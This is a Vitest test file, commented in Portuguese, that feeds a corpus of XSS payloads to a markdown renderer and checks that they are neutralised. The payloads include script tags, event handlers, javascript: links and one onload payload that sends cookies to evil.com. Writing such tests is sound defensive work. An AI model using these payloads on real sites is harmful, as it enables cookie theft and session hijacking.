import { describe, it, expect } from "vitest";
import { renderMarkdown } from "@/server/markdown";

/*
 * Ver docs/SECURITY.md, ameaça A5 — XSS via conteúdo do GitHub. Corpus
 * da Seção 10 do prompt original: <script>, <img onerror>, javascript:,
 * <iframe>, SVG com script — todos precisam sair sem nenhum executável.
 * README, títulos de issue, corpo de PR são todos conteúdo controlado
 * por terceiros e passam por este mesmo pipeline.
 */
describe("renderMarkdown — corpus de XSS", () => {
  const xssPayloads: Array<{ name: string; markdown: string }> = [
    {
      name: "script tag direto",
      markdown: "<script>alert(document.cookie)</script>",
    },
    {
      name: "script tag em bloco de código HTML bruto",
      markdown: '<div><script src="https://evil.com/x.js"></script></div>',
    },
    {
      name: "img com onerror",
      markdown: '<img src="x" onerror="alert(document.cookie)">',
    },
    {
      name: "img com onload",
      markdown: '<img src="valid.png" onload="fetch(`https://evil.com?c=${document.cookie}`)">',
    },
    {
      name: "link com javascript:",
      markdown: "[clique aqui](javascript:alert(document.cookie))",
    },
    {
      name: "link com javascript: em HTML bruto",
      markdown: '<a href="javascript:alert(1)">clique</a>',
    },
    {
      name: "iframe",
      markdown: '<iframe src="https://evil.com/phish"></iframe>',
    },
    {
      name: "object",
      markdown: '<object data="https://evil.com/x.swf"></object>',
    },
    {
      name: "embed",
      markdown: '<embed src="https://evil.com/x.swf">',
    },
    {
      name: "form com action externa",
      markdown: '<form action="https://evil.com/steal"><input name="x"></form>',
    },
    {
      name: "SVG com script embutido",
      markdown: '<svg><script>alert(document.cookie)</script></svg>',
    },
    {
      name: "SVG com onload",
      markdown: '<svg onload="alert(document.cookie)"></svg>',
    },
    {
      name: "style tag com expression",
      markdown: "<style>body{background:url('javascript:alert(1)')}</style>",
    },
    {
      name: "atributo style com url javascript",
      markdown: '<div style="background:url(javascript:alert(1))">x</div>',
    },
    {
      name: "data: URI com HTML embutido em link",
      markdown:
        '<a href="data:text/html,<script>alert(document.cookie)</script>">clique</a>',
    },
    {
      name: "meta refresh",
      markdown: '<meta http-equiv="refresh" content="0;url=https://evil.com">',
    },
    {
      name: "base tag redirecionando recursos relativos",
      markdown: '<base href="https://evil.com/">',
    },
    {
      name: "atributo on* genérico em tag permitida",
      markdown: '<p onclick="alert(1)">texto</p>',
    },
    {
      name: "xlink:href em SVG apontando para javascript:",
      markdown: '<svg><a xlink:href="javascript:alert(1)"><text>clique</text></a></svg>',
    },
    {
      name: "case mangling para evadir filtro simples (ScRiPt)",
      markdown: "<ScRiPt>alert(document.cookie)</ScRiPt>",
    },
  ];

  for (const { name, markdown } of xssPayloads) {
    it(`neutraliza: ${name}`, async () => {
      const { html } = await renderMarkdown(markdown);

      expect(html).not.toContain("<script");
      expect(html).not.toContain("<iframe");
      expect(html).not.toContain("<object");
      expect(html).not.toContain("<embed");
      expect(html).not.toContain("<form");
      expect(html).not.toContain("<style");
      expect(html).not.toContain("<base");
      expect(html).not.toContain("<meta");
      expect(html).not.toMatch(/on\w+\s*=/i); // nenhum atributo onXxx=
      // javascript: só é perigoso DENTRO de um atributo (href=, src=) —
      // como texto solto na página (ex: conteúdo de uma tag <style>
      // removida, sobrando só o texto) não executa nada. Checa
      // especificamente dentro de aspas de atributo.
      expect(html).not.toMatch(/=\s*"[^"]*javascript:/i);
      expect(html).not.toMatch(/\sstyle\s*=/i); // atributo style não é permitido
    });
  }

  it("preserva markdown legítimo (cabeçalhos, listas, links, code)", async () => {
    const markdown = [
      "# Título",
      "",
      "Um parágrafo com **negrito** e _itálico_.",
      "",
      "- item 1",
      "- item 2",
      "",
      "[link seguro](https://example.com)",
      "",
      "```js",
      "const x = 1;",
      "```",
    ].join("\n");

    const { html } = await renderMarkdown(markdown);

    expect(html).toContain("<h1");
    expect(html).toContain("<strong>negrito</strong>");
    expect(html).toContain("<em>itálico</em>");
    expect(html).toContain("<li>");
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain("<pre");
  });

  it("links externos recebem rel e target seguros", async () => {
    const { html } = await renderMarkdown("[link](https://example.com)");
    expect(html).toContain('rel="noopener noreferrer nofollow"');
    expect(html).toContain('target="_blank"');
  });

  it("imagem com data:image/ é permitida (única exceção documentada)", async () => {
    const pngDataUri =
      "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";
    const { html } = await renderMarkdown(`![alt](${pngDataUri})`);
    expect(html).toContain(`src="${pngDataUri}"`);
  });

  it("data: URI em link (não imagem) é removido, mesmo sendo data:image/", async () => {
    const { html } = await renderMarkdown("[clique](data:image/png;base64,abc123)");
    expect(html).not.toMatch(/href\s*=\s*"data:/i);
  });

  it("tabelas GFM são renderizadas corretamente", async () => {
    const markdown = ["| A | B |", "|---|---|", "| 1 | 2 |"].join("\n");
    const { html } = await renderMarkdown(markdown);
    expect(html).toContain("<table>");
    expect(html).toContain("<td>1</td>");
  });
});
